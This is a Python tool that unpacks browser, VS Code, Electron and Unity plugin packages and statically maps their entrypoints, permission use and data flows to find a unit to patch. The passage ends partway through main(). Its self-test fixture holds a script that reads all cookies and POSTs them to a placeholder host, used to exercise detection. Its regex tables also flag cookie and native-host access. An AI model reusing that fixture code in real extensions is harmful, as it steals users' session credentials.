#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""plugin-repro.py -- 插件包解包、入口/权限证据、最小可改单元提取（纯标准库）。

与 plugin-triage.py 的分工：
    triage = 只读初筛（不解包落盘），回答“是什么包、有哪些面”
    repro  = 解包到工作目录，回答“入口在哪一行、权限对应哪段代码、先改哪个单元”

用法:
    python plugin-repro.py --path extension.crx --out work/repro
    python plugin-repro.py --path app.asar --out work/repro --json
    python plugin-repro.py --path ./unpacked-extension --out work/repro
    python plugin-repro.py --self-test

输入：本地 crx/vsix/asar/zip/解压目录（只读原包；解包写入 --out 或临时目录）。
输出：JSON（entrypoints / permissions+evidence / data_flow / minimal_unit / next_probe），
      并写 <out>/plugin-repro.json。退出码：0 成功，2 结构化失败。
边界：不执行包内代码；协议复刻交 protocol-plugin（R24）。
"""
from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import re
import shutil
import struct
import sys
import tempfile
import zipfile

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass

MAX_TEXT = 2 * 1024 * 1024
MAX_FILE_BYTES = 32 * 1024 * 1024
MAX_ENTRIES = 6000
MAX_SCAN_FILES = 500
TEXT_EXT = {".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".json", ".xml",
            ".html", ".htm", ".css", ".txt", ".yml", ".yaml", ".properties"}

PERM_PATTERNS = {
    "cookies": r"(?:chrome|browser)\.cookies\.|\bcookies\b",
    "nativeMessaging": r"connectNative|sendNativeMessage|nativeMessaging",
    "debugger": r"(?:chrome|browser)\.debugger\.|\.attach\s*\(|sendCommand\s*\(",
    "scripting": r"(?:chrome|browser)\.scripting\.|executeScript\s*\(|insertCSS\s*\(",
    "userScripts": r"userScripts",
    "tabs": r"(?:chrome|browser)\.tabs\.",
    "storage": r"(?:chrome|browser)\.storage\.|localStorage|indexedDB",
    "webRequest": r"webRequest|declarativeNetRequest",
    "webNavigation": r"webNavigation",
    "downloads": r"(?:chrome|browser)\.downloads\.",
    "clipboardRead": r"clipboard|readText\s*\(",
    "clipboardWrite": r"clipboard|writeText\s*\(",
    "history": r"(?:chrome|browser)\.history\.",
    "bookmarks": r"(?:chrome|browser)\.bookmarks\.",
    "management": r"(?:chrome|browser)\.management\.",
    "proxy": r"(?:chrome|browser)\.proxy\.",
    "identity": r"(?:chrome|browser)\.identity\.|launchWebAuthFlow|getAuthToken",
    "offscreen": r"(?:chrome|browser)\.offscreen\.|createDocument\s*\(",
    "sidePanel": r"(?:chrome|browser)\.sidePanel\.",
    "contextMenus": r"contextMenus\.create",
    "alarms": r"(?:chrome|browser)\.alarms\.",
    "notifications": r"(?:chrome|browser)\.notifications\.",
    "tts": r"(?:chrome|browser)\.tts\.",
    "tabGroups": r"(?:chrome|browser)\.tabGroups\.",
    "activeTab": r"activeTab",
}

FLOW_RULES = [
    ("runtime.sendMessage", r"(?:chrome|browser)\.runtime\.sendMessage\s*\("),
    ("runtime.onMessage", r"onMessage\.addListener\s*\("),
    ("connectNative", r"connectNative|sendNativeMessage"),
    ("fetch", r"\bfetch\s*\("),
    ("XMLHttpRequest", r"XMLHttpRequest"),
    ("WebSocket", r"\bWebSocket\s*\("),
    ("storage", r"(?:chrome|browser)\.storage\.(?:local|sync|session)\.(?:get|set|remove|clear)"),
    ("cookies", r"(?:chrome|browser)\.cookies\."),
    ("scripting.executeScript", r"executeScript\s*\("),
    ("postMessage", r"\.postMessage\s*\("),
    ("shell.openExternal", r"shell\.openExternal\s*\("),
    ("ipcRenderer", r"ipcRenderer\.(?:invoke|send|sendSync)\s*\("),
    ("ipcMain", r"ipcMain\.(?:handle|on)\s*\("),
    ("child_process", r"require\(['\"]child_process['\"]\)|from\s+['\"]child_process['\"]"),
    ("eval", r"\beval\s*\(|new\s+Function\s*\("),
    ("readFile/writeFile", r"\bfs\.(?:readFile|writeFile|readdir|unlink|rm)\w*\s*\("),
]

SYMBOL_RE = re.compile(
    r"(?:function\s+([A-Za-z_$][\w$]*))"
    r"|(?:(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:async\s*)?(?:function|\([^)]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>))"
    r"|(?:class\s+([A-Za-z_$][\w$]*))"
)

UNITY_MARKERS = (b"BaseUnityPlugin", b"MelonMod", b"HarmonyPatch", b"HarmonyLib",
                 b"OnInitializeMelon", b"OnUpdate", b"OnGUI", b"Load()")


class ReproError(Exception):
    def __init__(self, blocked_at, reason):
        super().__init__(reason)
        self.blocked_at = blocked_at
        self.reason = reason


def rel_path(p):
    try:
        return os.path.relpath(p).replace(os.sep, "/")
    except ValueError:
        return str(p).replace(os.sep, "/")


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def read_text(data, limit=MAX_TEXT):
    data = data[:limit]
    for enc in ("utf-8", "utf-8-sig", "gb18030", "latin-1"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            continue
    return data.decode("latin-1", "replace")


def _safe_dest(root, name):
    name = str(name).replace("\\", "/").lstrip("/")
    parts = [p for p in name.split("/") if p not in ("", ".")]
    if not parts or any(p == ".." for p in parts):
        return None
    dest = os.path.join(root, *parts)
    try:
        if os.path.commonpath([os.path.abspath(root), os.path.abspath(dest)]) != os.path.abspath(root):
            return None
    except ValueError:
        return None
    return dest


def parse_asar_header(path):
    with open(path, "rb") as fh:
        head = fh.read(16)
    if len(head) < 12 or head[:4] != b"\x04\x00\x00\x00":
        raise ReproError("container", "不是标准 asar（头 4 字节非 04 00 00 00）")
    header_size = int.from_bytes(head[4:8], "little")
    with open(path, "rb") as fh:
        data = fh.read()
    start = data.find(b"{", 12, 512)
    if start < 0:
        raise ReproError("container", "asar 头中未找到 JSON 起点")
    try:
        obj, end = json.JSONDecoder().raw_decode(data[start:].decode("utf-8", "replace"))
    except Exception as exc:  # noqa: BLE001
        raise ReproError("container", "asar JSON 头解析失败: %s" % exc)
    data_offset = max(8 + header_size, start + end)
    data_offset = (data_offset + 3) & ~3
    return obj, data_offset


def walk_asar(node, prefix=""):
    out = []
    for name, info in sorted((node.get("files") or {}).items()):
        p = (prefix + "/" + name).lstrip("/")
        if not isinstance(info, dict):
            continue
        if "files" in info:
            out.append({"path": p, "dir": True})
            out.extend(walk_asar(info, p))
        else:
            out.append({
                "path": p, "dir": False,
                "size": int(info.get("size") or 0),
                "offset": int(info.get("offset") or 0),
                "unpacked": bool(info.get("unpacked", False)),
                "link": info.get("link"),
            })
    return out


def _extract_zip(raw, dest, source_name):
    try:
        zf = zipfile.ZipFile(io.BytesIO(raw))
    except zipfile.BadZipFile as exc:
        raise ReproError("unpack", "ZIP 解析失败: %s" % exc)
    names = zf.namelist()
    extracted, skipped = [], []
    for info in zf.infolist()[:MAX_ENTRIES]:
        name = info.filename
        if name.endswith("/"):
            continue
        target = _safe_dest(dest, name)
        if not target:
            skipped.append({"path": name, "why": "unsafe_path"})
            continue
        if info.file_size > MAX_FILE_BYTES:
            skipped.append({"path": name, "why": "too_large"})
            continue
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with zf.open(info) as src, open(target, "wb") as out:
            shutil.copyfileobj(src, out)
        extracted.append(name)
    meta = {"names": names, "extracted": extracted, "skipped": skipped[:50]}
    if source_name:
        meta["source"] = source_name
    return meta


def _extract_asar(path, dest):
    header, data_offset = parse_asar_header(path)
    entries = walk_asar(header)
    unpacked_root = path + ".unpacked"
    extracted, skipped = [], []
    with open(path, "rb") as fh:
        for e in entries:
            if e["dir"]:
                continue
            target = _safe_dest(dest, e["path"])
            if not target:
                skipped.append({"path": e["path"], "why": "unsafe_path"})
                continue
            if e.get("link"):
                skipped.append({"path": e["path"], "why": "link"})
                continue
            if e.get("unpacked"):
                src = _safe_dest(unpacked_root, e["path"])
                if src and os.path.isfile(src):
                    os.makedirs(os.path.dirname(target), exist_ok=True)
                    shutil.copy2(src, target)
                    extracted.append(e["path"])
                else:
                    skipped.append({"path": e["path"], "why": "unpacked_missing"})
                continue
            if e["size"] > MAX_FILE_BYTES:
                skipped.append({"path": e["path"], "why": "too_large"})
                continue
            fh.seek(data_offset + e["offset"])
            blob = fh.read(e["size"])
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as out:
                out.write(blob)
            extracted.append(e["path"])
    return {"names": [e["path"] for e in entries], "extracted": extracted,
            "skipped": skipped[:50], "data_offset": data_offset}


def _iter_text(root):
    n = 0
    for dp, dn, fn in os.walk(root):
        dn[:] = [d for d in dn if d not in (".git", "node_modules", "__pycache__", ".cache")]
        for f in sorted(fn):
            if n >= MAX_SCAN_FILES:
                return
            if os.path.splitext(f)[1].lower() not in TEXT_EXT:
                continue
            full = os.path.join(dp, f)
            try:
                if os.path.getsize(full) > MAX_TEXT:
                    continue
                yield os.path.relpath(full, root).replace("\\", "/"), read_text(open(full, "rb").read())
                n += 1
            except OSError:
                continue


def _line_of(text, pos):
    return text.count("\n", 0, pos) + 1


def _snippet(text, start, end, width=60):
    a = max(0, text.rfind("\n", 0, start) + 1)
    b = text.find("\n", end)
    if b < 0:
        b = min(len(text), end + width)
    return text[a:b].strip()[:220]


def _scan(texts, rules, limit_per_rule=8, per_file=2):
    out = []
    for kind, rx in rules:
        pat = re.compile(rx)
        hits = []
        for name, text in texts:
            file_hits = 0
            for m in pat.finditer(text):
                hits.append({"file": name, "line": _line_of(text, m.start()),
                             "snippet": _snippet(text, m.start(), m.end())})
                file_hits += 1
                if file_hits >= per_file or len(hits) >= limit_per_rule:
                    break
            if len(hits) >= limit_per_rule:
                break
        if hits:
            out.append({"kind": kind, "hits": hits})
    return out


def _find_manifest(names):
    c = [n for n in names if n.replace("\\", "/").lower().endswith("manifest.json")]
    c.sort(key=lambda n: (n.count("/"), len(n)))
    return c[0] if c else None


def _find_package(names):
    c = [n for n in names if n.replace("\\", "/").lower().endswith("package.json")]
    c.sort(key=lambda n: (0 if n.endswith("extension/package.json") else 1, n.count("/"), len(n)))
    return c[0] if c else None


def _find_plugin_xml(names):
    c = [n for n in names if n.replace("\\", "/").lower().endswith("meta-inf/plugin.xml")]
    return c[0] if c else None


def _load_json(root, name):
    if not name:
        return None
    try:
        return json.loads(read_text(open(os.path.join(root, name.replace("/", os.sep)), "rb").read()))
    except Exception:  # noqa: BLE001
        return None


def _add_entry(entries, root, kind, path, **extra):
    if not path or not isinstance(path, str):
        return
    clean = path.replace("\\", "/").lstrip("/")
    item = {"kind": kind, "path": clean,
            "exists": os.path.isfile(os.path.join(root, clean.replace("/", os.sep)))}
    item.update(extra)
    entries.append(item)


def _manifest_entries(manifest, root):
    entries = []
    if not isinstance(manifest, dict):
        return entries
    bg = manifest.get("background") or {}
    _add_entry(entries, root, "background.service_worker", bg.get("service_worker"))
    for s in bg.get("scripts") or []:
        _add_entry(entries, root, "background.script", s)
    for cs in manifest.get("content_scripts") or []:
        for js in cs.get("js") or []:
            _add_entry(entries, root, "content_script.js", js,
                       world=cs.get("world", "ISOLATED"), run_at=cs.get("run_at", ""),
                       matches=cs.get("matches") or [])
        for css in cs.get("css") or []:
            _add_entry(entries, root, "content_script.css", css)
    action = manifest.get("action") or manifest.get("browser_action") or {}
    _add_entry(entries, root, "action.popup", action.get("default_popup"))
    opts = manifest.get("options_page")
    if not opts and isinstance(manifest.get("options_ui"), dict):
        opts = manifest["options_ui"].get("page")
    _add_entry(entries, root, "options_page", opts)
    _add_entry(entries, root, "devtools_page", manifest.get("devtools_page"))
    if isinstance(manifest.get("side_panel"), dict):
        _add_entry(entries, root, "side_panel", manifest["side_panel"].get("default_path"))
    for war in manifest.get("web_accessible_resources") or []:
        if isinstance(war, dict):
            for r in war.get("resources") or []:
                _add_entry(entries, root, "web_accessible_resource", r,
                           matches=war.get("matches") or [])
    return entries


def _package_entries(pkg, root, pkg_dir=""):
    entries = []
    if not isinstance(pkg, dict):
        return entries
    base = (pkg_dir or "").strip("/")

    def pkg_path(p):
        p = str(p or "").replace("\\", "/").lstrip("./")
        return (base + "/" + p).lstrip("/") if base and p else p

    _add_entry(entries, root, "package.main", pkg_path(pkg.get("main")))
    build = pkg.get("build") if isinstance(pkg.get("build"), dict) else {}
    if build.get("preload"):
        _add_entry(entries, root, "electron.preload", pkg_path(build.get("preload")))
    if build.get("main"):
        _add_entry(entries, root, "electron.main", pkg_path(build.get("main")))
    for ev in pkg.get("activationEvents") or []:
        entries.append({"kind": "activation_event", "value": ev, "exists": True})
    contrib = pkg.get("contributes") or {}
    if isinstance(contrib, dict):
        for c in contrib.get("commands") or []:
            if isinstance(c, dict):
                entries.append({"kind": "command", "command": c.get("command"),
                                "title": c.get("title"), "exists": True})
        for lang in contrib.get("languages") or []:
            if isinstance(lang, dict):
                entries.append({"kind": "language", "id": lang.get("id"),
                                "extensions": lang.get("extensions") or [], "exists": True})
    return entries


def _plugin_xml_entries(text, root):
    entries = []
    for m in re.finditer(r"<action\b[^>]*\bid=[\"']([^\"']+)[\"'][^>]*>", text):
        entries.append({"kind": "jetbrains.action", "id": m.group(1), "exists": True})
    for m in re.finditer(r"<(?:applicationService|projectService)\b[^>]*serviceImplementation=[\"']([^\"']+)[\"']", text):
        entries.append({"kind": "jetbrains.service", "class": m.group(1), "exists": True})
    for m in re.finditer(r"<extensionPoint\b[^>]*name=[\"']([^\"']+)[\"']", text):
        entries.append({"kind": "jetbrains.extension_point", "name": m.group(1), "exists": True})
    return entries[:60]


def _permissions(manifest, texts, root):
    # 血案（R2 审计）：texts 里包含 manifest.json 时，只要权限名写在声明里就会
    # 被判 observed —— 那是"声明"不是"使用"。这里只扫代码文件。
    texts = [(n, t) for (n, t) in texts
             if not n.lower().endswith(('manifest.json', '.md', '.txt'))]
    # 血案（R2 审计）：texts 里包含 manifest.json 时，只要权限名写在声明里就会
    # 被判 observed —— 那是"声明"不是"使用"。这里只扫代码文件。
    texts = [(n, t) for (n, t) in texts
             if not n.lower().endswith(('manifest.json', '.md', '.txt'))]
    out = []
    if not isinstance(manifest, dict):
        return out
    perms = manifest.get("permissions") or []
    if isinstance(perms, str):
        perms = [perms]
    for perm in perms:
        rx = PERM_PATTERNS.get(perm)
        hits = []
        if rx:
            pat = re.compile(rx)
            for name, text in texts:
                for m in pat.finditer(text):
                    hits.append({"file": name, "line": _line_of(text, m.start()),
                                 "snippet": _snippet(text, m.start(), m.end())})
                    break
                if len(hits) >= 3:
                    break
        out.append({"name": perm, "risk": _risk(perm),
                    "status": "observed" if hits else "unexplained-static",
                    "evidence": hits})
    return out


def _risk(name):
    if name == "nativeMessaging":
        return "critical"
    high = {"debugger", "cookies", "webRequest", "webRequestBlocking",
            "scripting", "userScripts", "history", "bookmarks", "clipboardRead",
            "management", "proxy", "sessions", "enterprise.platformKeys"}
    medium = {"tabs", "webNavigation", "downloads", "identity", "offscreen",
              "declarativeNetRequest", "declarativeNetRequestWithHostAccess",
              "clipboardWrite", "geolocation", "topSites"}
    if name in high:
        return "high"
    if name in medium:
        return "medium"
    return "low"


def _host_patterns(manifest):
    if not isinstance(manifest, dict):
        return []
    hosts = manifest.get("host_permissions") or []
    if isinstance(hosts, str):
        hosts = [hosts]
    out = [{"pattern": h, "risk": "critical" if h == "<all_urls>" else
            ("high" if h in ("*://*/*", "http://*/*") else "medium")} for h in hosts]
    for cs in manifest.get("content_scripts") or []:
        for m in cs.get("matches") or []:
            out.append({"pattern": m, "risk": "critical" if m == "<all_urls>" else
                        ("high" if m in ("*://*/*", "http://*/*") else "medium"),
                        "source": "content_scripts.matches"})
    ec = manifest.get("externally_connectable")
    if isinstance(ec, dict):
        for m in ec.get("matches") or []:
            out.append({"pattern": m, "risk": "high", "source": "externally_connectable"})
    return out


def _symbols(text, limit=15):
    out = []
    for m in SYMBOL_RE.finditer(text):
        name = m.group(1) or m.group(2) or m.group(3)
        if name and name not in out:
            out.append(name)
        if len(out) >= limit:
            break
    return out


def _pick_minimal(root, entries, flows, extra_candidates=None):
    counts = {}
    for f in flows:
        for h in f["hits"]:
            counts[h["file"]] = counts.get(h["file"], 0) + 1
    cands = []
    for e in entries:
        p = e.get("path")
        if p and e.get("exists") and os.path.isfile(os.path.join(root, p.replace("/", os.sep))):
            if not p.lower().endswith((".json", ".xml", ".html", ".css")):
                cands.append(p)
    cands += [c for c in (extra_candidates or []) if c]
    if not cands:
        text_files = list(_iter_text(root))
        cands = [n for n, _ in text_files[:1]]
    if not cands:
        return {}
    best = max(cands, key=lambda p: (counts.get(p, 0), os.path.getsize(os.path.join(root, p.replace("/", os.sep)))))
    full = os.path.join(root, best.replace("/", os.sep))
    text = read_text(open(full, "rb").read())
    return {"path": best, "lines": text.count("\n") + 1,
            "symbols": _symbols(text), "flow_hits": counts.get(best, 0),
            "why": "入口文件且命中的数据流/危险调用最多；先在此处下断或做最小改动"}


def _unity(root, names):
    norm = [n.replace("\\", "/") for n in names]
    low = [n.lower() for n in norm]
    if not any(any(m in n for m in ("bepinex", "melonloader", "gameassembly.dll",
                                    "global-metadata.dat", "assembly-csharp.dll"))
               for n in low):
        return {}
    loader = "BepInEx" if any("bepinex" in n for n in low) else (
        "MelonLoader" if any("melonloader" in n for n in low) else None)
    dlls = [n for n in norm if re.search(r"(bepinex/plugins|melonloader/mods)/[^/]+\.dll$", n, re.I)]
    found = {}
    for rel in dlls[:20]:
        full = os.path.join(root, rel.replace("/", os.sep))
        try:
            blob = open(full, "rb").read(MAX_FILE_BYTES)
        except OSError:
            continue
        found[rel] = [m.decode() for m in UNITY_MARKERS if m in blob]
    return {"loader": loader,
            "runtime": "il2cpp" if any(n.endswith("gameassembly.dll") for n in low)
            or any(n.endswith("global-metadata.dat") for n in low) else "mono",
            "plugin_dlls": dlls[:40], "dll_markers": found}


def analyze(path, out_dir):
    if not os.path.exists(path):
        raise ReproError("input", "路径不存在: %s" % path)
    notes, skipped = [], []
    if os.path.isdir(path):
        container = "directory"
        root = path
        names = []
        for dp, dn, fn in os.walk(path):
            dn[:] = [d for d in dn if d not in (".git", "__pycache__", "node_modules")]
            for f in fn:
                names.append(os.path.relpath(os.path.join(dp, f), path).replace("\\", "/"))
                if len(names) >= MAX_ENTRIES:
                    break
        extracted = names
    else:
        root = os.path.join(out_dir, "unpack")
        os.makedirs(root, exist_ok=True)
        raw = open(path, "rb").read()
        if raw[:4] == b"Cr24":
            container = "crx"
            i = raw.find(b"PK\x03\x04")
            if i < 0:
                raise ReproError("unpack", "CRX 头后未找到 ZIP 起点")
            meta = _extract_zip(raw[i:], root, "crx")
        elif raw[:4] == b"\x04\x00\x00\x00":
            container = "asar"
            meta = _extract_asar(path, root)
        elif raw[:4] == b"PK\x03\x04":
            probe = zipfile.ZipFile(io.BytesIO(raw)).namelist()
            low = [n.replace("\\", "/").lower() for n in probe]
            ext = os.path.splitext(path)[1].lower()
            if ext == ".vsix" or any(n.endswith("extension/package.json") for n in low) \
                    or any(n.endswith("extension.vsixmanifest") for n in low):
                container = "vsix"
            elif ext == ".jar" or any(n.endswith("meta-inf/plugin.xml") for n in low):
                container = "jar"
            elif ext == ".xpi":
                container = "xpi"
            else:
                container = "zip"
            meta = _extract_zip(raw, root, None)
        else:
            raise ReproError("container", "无法识别的容器 magic=%s" % raw[:8].hex())
        names = meta.get("names") or []
        extracted = meta.get("extracted") or []
        skipped = meta.get("skipped") or []
    texts = list(_iter_text(root))
    manifest_name = _find_manifest(names)
    package_name = _find_package(names)
    plugin_xml_name = _find_plugin_xml(names)
    manifest = _load_json(root, manifest_name)
    pkg = _load_json(root, package_name)
    plugin_text = ""
    if plugin_xml_name:
        try:
            plugin_text = read_text(open(os.path.join(root, plugin_xml_name.replace("/", os.sep)), "rb").read())
        except OSError:
            plugin_text = ""
    entries = []
    entries += _manifest_entries(manifest, root)
    entries += _package_entries(pkg, root, os.path.dirname(package_name or ""))
    if plugin_text:
        entries += _plugin_xml_entries(plugin_text, root)
    flows = _scan(texts, FLOW_RULES)
    permissions = _permissions(manifest, texts, root)
    hosts = _host_patterns(manifest)
    unity = _unity(root, names)
    native = {
        "node_modules": [n for n in names if n.lower().endswith(".node")][:40],
        "v8_bytecode": [n for n in names if n.lower().endswith(".jsc")][:40],
        "sourcemaps": [n for n in names if n.lower().endswith(".map")][:40],
        "unity_plugin_dlls": (unity or {}).get("plugin_dlls") or [],
    }
    if manifest:
        minimal = _pick_minimal(root, entries, flows)
    elif pkg:
        minimal = _pick_minimal(root, entries, flows)
    elif unity:
        dlls = (unity or {}).get("plugin_dlls") or []
        minimal = {"path": dlls[0] if dlls else "", "symbols": (unity.get("dll_markers") or {}).get(dlls[0], []) if dlls else [],
                   "why": "Unity 插件 DLL：先看插件类与 Harmony patch 目标（需 ilspycmd/dnSpy/Cpp2IL）"}
    else:
        minimal = _pick_minimal(root, entries, flows)
    if pkg and not (pkg.get("main") or pkg.get("build")):
        notes.append("package.json 无 main/build.main：激活入口未闭环")
    if pkg:
        if (pkg.get("capabilities") or {}).get("untrustedWorkspaces") is not None:
            notes.append("VSIX 受限工作区: %s" % json.dumps(pkg["capabilities"]["untrustedWorkspaces"], ensure_ascii=False)[:160])
    if container == "asar":
        if native["v8_bytecode"]:
            notes.append("存在 .jsc 字节码：需匹配 V8 版本，不能当 JS 读")
        if native["sourcemaps"] == []:
            notes.append("无 source map：先 prettier/格式化，再按行号下断")
    if any(s.get("why") == "unpacked_missing" for s in skipped):
        notes.append("asar 含 unpacked 文件但缺少 app.asar.unpacked：原生模块需单独取证")
    if unity:
        notes.append("Unity 包：先确认加载器日志，再反编译插件 DLL；IL2CPP 需 global-metadata 匹配版本")
    blocked = []
    for tool in ("ilspycmd", "jadx", "dnSpy", "Cpp2IL"):
        if shutil.which(tool) is None:
            blocked.append("tool-missing:%s" % tool)
    next_probe = []
    if container in ("crx", "zip", "vsix", "xpi", "directory") and manifest:
        next_probe.append("浏览器加载已解压目录，DevTools 观察 service worker 唤醒、消息与存储写入")
    if any(f["kind"] == "connectNative" for f in flows):
        next_probe.append("检查 native host manifest 的 allowed_origins 与宿主二进制")
    if container == "asar":
        next_probe.append("按 main/preload/renderer 三层复核 IPC channel 与校验点")
    if unity:
        next_probe.append("用 ilspycmd/Cpp2IL 反编译插件 DLL，定位 Harmony patch 目标")
    if any(f["kind"] in ("fetch", "WebSocket", "XMLHttpRequest") for f in flows):
        next_probe.append("对远端 URL 做离线域名/证书/更新链核对；协议复刻转 protocol-plugin")
    next_probe.append("最小可改单元改动前先备份，一次只改一个变量并留基线")
    return {
        "ok": True,
        "script": "plugin-repro.py",
        "container": container,
        "sha256": None if os.path.isdir(path) else sha256_file(path),
        "source": rel_path(path),
        "unpacked": rel_path(root),
        "file_count": len(names),
        "extracted_count": len(extracted),
        "skipped": skipped[:50],
        "entrypoints": entries[:120],
        "manifest": {
            "path": manifest_name,
            "name": (manifest or {}).get("name"),
            "version": (manifest or {}).get("version"),
            "manifest_version": (manifest or {}).get("manifest_version"),
            "background": (manifest or {}).get("background"),
            "content_scripts": (manifest or {}).get("content_scripts"),
            "externally_connectable": (manifest or {}).get("externally_connectable"),
            "update_url": (manifest or {}).get("update_url"),
        } if manifest else {},
        "package": {
            "path": package_name,
            "name": (pkg or {}).get("name"),
            "version": (pkg or {}).get("version"),
            "main": (pkg or {}).get("main"),
            "activationEvents": (pkg or {}).get("activationEvents") or [],
            "contributes_commands": [c.get("command") for c in ((pkg or {}).get("contributes") or {}).get("commands") or [] if isinstance(c, dict)],
            "capabilities": (pkg or {}).get("capabilities"),
            "engines": (pkg or {}).get("engines"),
        } if pkg else {},
        "plugin_xml": {
            "path": plugin_xml_name,
            "actions": len(re.findall(r"<action\b", plugin_text)),
            "services": len(re.findall(r"<(?:application|project)Service\b", plugin_text)),
            "extension_points": len(re.findall(r"<extensionPoint\b", plugin_text)),
        } if plugin_text else {},
        "permissions": permissions,
        "host_permissions": hosts,
        "data_flow": flows,
        "native": native,
        "unity": unity,
        "minimal_unit": minimal,
        "notes": notes,
        "blocked": blocked,
        "next_probe": next_probe,
    }


def _zip_bytes(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            zf.writestr(name, data if isinstance(data, bytes) else data.encode("utf-8"))
    return buf.getvalue()


def _asar_bytes(files):
    metas, parts, off = {}, [], 0
    for name, data in files.items():
        blob = data if isinstance(data, bytes) else data.encode("utf-8")
        pad = (-off) % 4
        parts.append(b"\x00" * pad)
        off += pad
        metas[name] = {"size": len(blob), "offset": str(off)}
        parts.append(blob)
        off += len(blob)
    hb = json.dumps({"files": metas}, separators=(",", ":")).encode("utf-8")
    core = struct.pack("<I", 4) + b"\x00\x00\x00\x00" + struct.pack("<I", len(hb)) + hb
    prefix = core + b"\x00" * ((-len(core)) % 4)
    prefix = prefix[:4] + struct.pack("<I", len(prefix) - 8) + prefix[8:]
    return prefix + b"".join(parts)


def self_test():
    checks = []
    tmp = tempfile.mkdtemp(prefix="plugin-repro-selftest-")
    try:
        src = os.path.join(tmp, "ext.zip")
        open(src, "wb").write(_zip_bytes({
            "manifest.json": json.dumps({
                "manifest_version": 3, "name": "Demo", "version": "1.0",
                "permissions": ["cookies", "nativeMessaging", "storage"],
                "host_permissions": ["<all_urls>"],
                "background": {"service_worker": "bg.js"},
                "content_scripts": [{"matches": ["<all_urls>"], "js": ["cs.js"]}],
            }),
            "bg.js": "chrome.runtime.onMessage.addListener(function(m,s,r){\n"
                     "  chrome.cookies.getAll({}, function(c){ fetch('https://x.invalid/c',{method:'POST',body:JSON.stringify(c)}); });\n"
                     "  chrome.storage.local.set({k:1});\n"
                     "  var p=chrome.runtime.connectNative('com.demo.host');\n"
                     "});\n",
            "cs.js": "document.addEventListener('copy',function(){chrome.runtime.sendMessage({t:'copy'});});\n",
        }))
        out1 = os.path.join(tmp, "out1")
        os.makedirs(out1)
        r = analyze(src, out1)
        checks.append(r["container"] == "zip")
        checks.append(any(p["name"] == "cookies" and p["status"] == "observed" for p in r["permissions"]))
        checks.append(any(p["name"] == "nativeMessaging" and p["evidence"] for p in r["permissions"]))
        checks.append(any(e["kind"] == "background.service_worker" for e in r["entrypoints"]))
        checks.append(any(f["kind"] == "runtime.sendMessage" for f in r["data_flow"]))
        checks.append(r["minimal_unit"].get("path") == "bg.js")

        asar = os.path.join(tmp, "app.asar")
        open(asar, "wb").write(_asar_bytes({
            "package.json": json.dumps({"name": "demo", "main": "main.js", "build": {"preload": "pre.js"}}),
            "main.js": "const {ipcMain}=require('electron');\nipcMain.handle('x',()=>1);\n",
            "pre.js": "const {contextBridge,ipcRenderer}=require('electron');\n",
        }))
        out2 = os.path.join(tmp, "out2")
        os.makedirs(out2)
        r = analyze(asar, out2)
        checks.append(r["container"] == "asar")
        checks.append(any(e["kind"] == "package.main" and e["exists"] for e in r["entrypoints"]))
        checks.append(any(f["kind"] == "ipcMain" for f in r["data_flow"]))
        checks.append(r["minimal_unit"].get("path") == "main.js")

        vsix = os.path.join(tmp, "ext.vsix")
        open(vsix, "wb").write(_zip_bytes({
            "extension/package.json": json.dumps({
                "name": "demo", "version": "1.0", "main": "./extension.js",
                "activationEvents": ["onCommand:demo.run"],
                "contributes": {"commands": [{"command": "demo.run", "title": "Run"}]},
            }),
            "extension/extension.js": "const vscode=require('vscode');\nfunction activate(ctx){}\n",
        }))
        out3 = os.path.join(tmp, "out3")
        os.makedirs(out3)
        r = analyze(vsix, out3)
        checks.append(r["container"] == "vsix")
        checks.append(any(e["kind"] == "activation_event" for e in r["entrypoints"]))
        checks.append(r["minimal_unit"].get("path") == "extension/extension.js")

        udir = os.path.join(tmp, "game")
        os.makedirs(os.path.join(udir, "BepInEx", "plugins"))
        open(os.path.join(udir, "GameAssembly.dll"), "wb").write(b"MZ")
        open(os.path.join(udir, "global-metadata.dat"), "wb").write(b"meta")
        open(os.path.join(udir, "BepInEx", "plugins", "DemoMod.dll"), "wb").write(
            b"MZ BaseUnityPlugin HarmonyPatch OnUpdate")
        out4 = os.path.join(tmp, "out4")
        os.makedirs(out4)
        r = analyze(udir, out4)
        checks.append(r["unity"].get("runtime") == "il2cpp")
        checks.append("BepInEx/plugins/DemoMod.dll" in (r["unity"].get("plugin_dlls") or []))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    if not all(checks):
        raise ReproError("self-test", "断言失败：%s" % [i for i, ok in enumerate(checks) if not ok])
    print(json.dumps({"ok": True, "script": "plugin-repro.py", "checks": len(checks)},
                     ensure_ascii=False))
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="插件包解包 + 入口/权限证据 + 最小可改单元（crx/vsix/asar/zip/目录；只读原包）")
    ap.add_argument("--path", "-p", default=None, help="crx/vsix/asar/zip 文件或解压目录")
    ap.add_argument("--out", default=None, help="解包与 JSON 输出目录（缺省用临时目录）")
    ap.add_argument("--json", action="store_true", help="stdout 输出 JSON")
    ap.add_argument("--self-test", action="store_true", help="离线内置样本自检（不需要 --path）")
    args = ap.parse_args(argv)
    if args.self_test:
        try:
            return self_test()
        except ReproError as exc:
            print(json.dumps({"ok": False, "blocked_at": exc.blocked_at, "reason": exc.reason},
                             ensure_ascii=False))
            return 2
        except Exception as exc:  # noqa: BLE001
            print(json.dumps({"ok": False, "blocked_at": "self-test", "reason": str(exc)[:200]},
                             ensure_ascii=False))
            return 2
    if not args.path:
        ap.error("--path 必填（或使用 --self-test）")
    temp_root = None
    out_dir = args.out
    try:
        if not out_dir:
            temp_root = tempfile.mkdtemp(prefix="plugin-repro-")
            out_dir = temp_root
        os.makedirs(out_dir, exist_ok=True)
